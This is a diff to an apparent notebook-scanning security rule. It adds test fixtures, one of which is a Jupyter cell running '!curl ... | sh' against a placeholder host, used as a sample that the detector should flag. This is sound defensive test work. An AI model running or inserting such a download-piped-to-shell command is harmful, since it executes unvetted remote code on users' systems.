@@ -7,6 +7,7 @@ from pathlib import Path
 from guardana.core.evaluator.base import Verdict
 from guardana.core.report import Evidence, Finding
 from guardana.core.rule import RuleContext, RuleMeta
+from guardana.core.rule.fixture import FixtureOutcome, RuleFixture, materialise
 from guardana.core.safety import Detection
 from guardana.core.severity import Severity
 from guardana.core.source import PythonSource
@@ -18,6 +19,7 @@ from guardana.core.taxonomy import (
     OWASP_LLM04_2026,
 )
 from guardana.rules._base import ArtifactRule
+from guardana.rules.supply_chain import _samples
 from guardana.rules.supply_chain._code_sinks import code_sinks
 from guardana.rules.supply_chain._leads import unread_component, unscanned_verdict
 from guardana.rules.supply_chain._reading import MAX_SCAN_BYTES, read_text_prefix
@@ -92,6 +94,36 @@ class NotebookPayloadRule(ArtifactRule):
         required_capabilities=frozenset({Capability.READ_FILES}),
         detection=Detection.HEURISTIC,
     )
+
+    def fixtures(self) -> Iterable[RuleFixture]:
+        """Sample a download piped to a shell, a plain cell and a notebook that is not JSON."""
+        return materialise(
+            (
+                _samples.sample(
+                    "a shell escape piping a download into sh",
+                    FixtureOutcome.FINDING,
+                    {
+                        "setup.ipynb": _samples.notebook(
+                            "!curl -s https://setup.example.invalid/i.sh | sh\n"
+                        )
+                    },
+                ),
+                _samples.sample(
+                    "a cell that only prints",
+                    FixtureOutcome.CLEAN,
+                    {
+                        "setup.ipynb": _samples.notebook(
+                            "import json\nprint(json.dumps({'ok': True}))\n"
+                        )
+                    },
+                ),
+                _samples.sample(
+                    "a notebook cut off mid-document",
+                    FixtureOutcome.INCONCLUSIVE,
+                    {"setup.ipynb": _samples.notebook("print(1)\n")[:-2]},
+                ),
+            )
+        )
 
     def run(self, target: Target, ctx: RuleContext) -> Iterable[Finding]:
         """Scan every `.ipynb` for code-execution sinks and shell payloads."""
